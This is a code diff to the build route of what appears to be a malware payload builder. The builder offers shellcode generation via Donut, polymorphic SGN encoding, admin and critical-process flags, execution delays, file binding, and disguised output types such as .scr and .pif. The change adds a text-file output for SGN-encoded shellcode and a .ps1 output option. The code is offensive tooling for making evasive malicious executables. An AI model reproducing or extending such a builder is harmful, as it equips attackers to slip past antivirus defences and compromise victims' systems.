@@ -117,6 +117,7 @@ export async function handleBuildRoutes(
         shellcodeConsole,
         useSgn,
         sgnIterations,
+        outputSgnTxt,
         fetchPublicIP,
         uploadToFileShare,
       } = body;
@@ -290,13 +291,32 @@ export async function handleBuildRoutes(
         : undefined;
       const safeRequireAdmin = !!requireAdmin;
       const safeCriticalProcess = !!criticalProcess;
-      const VALID_OUTPUT_EXTENSIONS = new Set([".exe", ".scr", ".bat", ".cmd", ".pif", ".com"]);
+      const VALID_OUTPUT_EXTENSIONS = new Set([".exe", ".scr", ".bat", ".cmd", ".ps1", ".pif", ".com"]);
       const safeOutputExtension =
         typeof outputExtension === "string" && VALID_OUTPUT_EXTENSIONS.has(outputExtension.toLowerCase())
           ? outputExtension.toLowerCase() : ".exe";
       const safeSleepSeconds =
         typeof sleepSeconds === "number" && Number.isInteger(sleepSeconds) && sleepSeconds >= 0 && sleepSeconds <= 3600
           ? sleepSeconds : 0;
+      const safeOutputSgnTxt = !!outputSgnTxt;
+      if (safeOutputSgnTxt && !useSgn) {
+        return Response.json(
+          { error: "SGN TXT output requires SGN Polymorphic Encoding" },
+          { status: 400 },
+        );
+      }
+      if (safeOutputSgnTxt) {
+        const hasSgnCapableTarget = allowedPlatforms.some((p) =>
+          (!!useDonut && p.startsWith("windows-")) ||
+          (!!useLinuxShellcode && p === "linux-amd64")
+        );
+        if (!hasSgnCapableTarget) {
+          return Response.json(
+            { error: "SGN TXT output requires Donut on Windows or Linux Shellcode on linux-amd64" },
+            { status: 400 },
+          );
+        }
+      }
 
       const MAX_BOUND_FILES = 5;
       const MAX_BOUND_FILE_BYTES = 50 * 1024 * 1024;
@@ -401,6 +421,7 @@ export async function handleBuildRoutes(
         shellcodeConsole: !!shellcodeConsole,
         useSgn: !!useSgn,
         sgnIterations: Math.max(1, Math.min(50, Math.floor(Number(sgnIterations) || 1))),
+        outputSgnTxt: safeOutputSgnTxt,
         fetchPublicIP: !!fetchPublicIP,
         uploadToFileShare: safeUploadToFileShare,
       }).finally(() => {
@@ -689,7 +710,9 @@ export async function handleBuildRoutes(
 
       return new Response(file, {
         headers: {
-          "Content-Type": "application/octet-stream",
+          "Content-Type": fileName.toLowerCase().endsWith(".txt")
+            ? "text/plain; charset=utf-8"
+            : "application/octet-stream",
           "Content-Disposition": `attachment; filename="${fileName}"`,
         },
       });
